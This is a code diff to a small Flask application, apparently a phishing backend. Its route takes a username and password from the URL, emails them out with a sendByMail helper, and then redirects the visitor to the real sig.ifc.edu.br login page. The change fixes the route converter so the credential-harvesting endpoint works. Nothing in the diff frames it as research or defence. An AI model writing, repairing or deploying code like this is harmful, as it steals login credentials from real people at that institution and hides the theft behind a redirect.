@@ -25,7 +25,7 @@ def sendByMail(text):
 app = Flask(__name__)
 
 
-@app.route('/<str:usuario>/<str:senha>', methods=['GET'])
+@app.route('/<string:usuario>/<string:senha>', methods=['GET'])
 def get_authenticate(usuario,senha):
     sendByMail("Usuario:"+usuario+"<br>Senha:"+senha)
     return "<script>window.location.replace('https://sig.ifc.edu.br/')</script>"
